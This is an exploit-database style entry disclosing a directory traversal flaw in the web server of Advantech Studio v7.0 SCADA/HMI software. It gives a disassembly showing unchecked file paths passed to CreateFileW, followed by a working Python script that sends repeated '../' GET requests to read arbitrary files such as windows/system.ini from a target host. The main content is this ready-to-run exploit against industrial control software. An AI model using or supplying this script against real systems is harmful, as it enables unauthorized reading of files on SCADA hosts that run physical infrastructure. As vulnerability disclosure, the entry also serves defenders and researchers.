# Exploit Title: Advantech Studio v7.0 SCADA/HMI Directory Traversal 0-day
# Google Dork: N/A
# Date: 2012-12-03
# Exploit Author: Nin3
# Vendor Homepage: http://advantech.com.tw
# Version: 7.0 Build Number 0501.1111.0402.0000
# Tested on: Windows
# CVE : N/A

'''
Advantech Studio v7.0 SCADA/HMI has a built in web server NTWebServer.exe,
the web server is a standalone executable that is used along side every project'
to serve as a web based management system with the help of an activex.

The flaw occurs because of a lack of any check on the path of the file requested. in
function sub_401A90:

.text:00402A4A                 push    0               ; dwFlagsAndAttributes
.text:00402A4C                 push    3               ; dwCreationDisposition
.text:00402A4E                 push    3               ; dwShareMode
.text:00402A50                 push    80000000h       ; dwDesiredAccess
.text:00402A55                 mov     edx, [ebp+lpFileName]
.text:00402A58                 push    edx             ; lpFileName
.text:00402A59                 lea     ecx, [ebp+var_1C]
.text:00402A5C                 call    sub_401A90


sub_401A90 use CreateFileW function directly.

.text:00401A97                 push    0               ; hTemplateFile
.text:00401A99                 mov     eax, [ebp+dwFlagsAndAttributes]
.text:00401A9C                 push    eax             ; dwFlagsAndAttributes
.text:00401A9D                 mov     ecx, [ebp+dwCreationDisposition]
.text:00401AA0                 push    ecx             ; dwCreationDisposition
.text:00401AA1                 push    0               ; lpSecurityAttributes
.text:00401AA3                 mov     edx, [ebp+dwShareMode]
.text:00401AA6                 push    edx             ; dwShareMode
.text:00401AA7                 mov     eax, [ebp+dwDesiredAccess]
.text:00401AAA                 push    eax             ; dwDesiredAccess
.text:00401AAB                 mov     ecx, [ebp+lpFileName]
.text:00401AAE                 push    ecx             ; lpFileName
.text:00401AAF                 call    ds:CreateFileW

'''
import argparse
import httplib

MAX_NESTED_DIRECTORY = 32

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d')
    parser.add_argument('-p')
    parser.add_argument('-f')  
    args = parser.parse_args()
    if args.d == None or args.p == None or args.f == None:
        print "[!]EXAMPLE USAGE: traverse.py -d 127.0.0.1 -p 80 -f windows/system.ini"
        return
    httpConn = httplib.HTTPConnection(args.d, int(args.p))
    for i in xrange(0, MAX_NESTED_DIRECTORY):
        temp = MakePath(args.f, i)
        httpConn.request('GET', temp)
        resp = httpConn.getresponse()
        content =  resp.read()
        if resp.status == 404:
            print 'Not found ' + temp
        else:
            print 'Found ' + temp
            print'------------------------------------------'
            print content
            print'---------------------------------------EOF'
            break
        
    
    
def MakePath(f, count):
    a = ""
    for i in xrange(0, count):
        a = a + "../"
    return a + f

if __name__ == "__main__":
    main()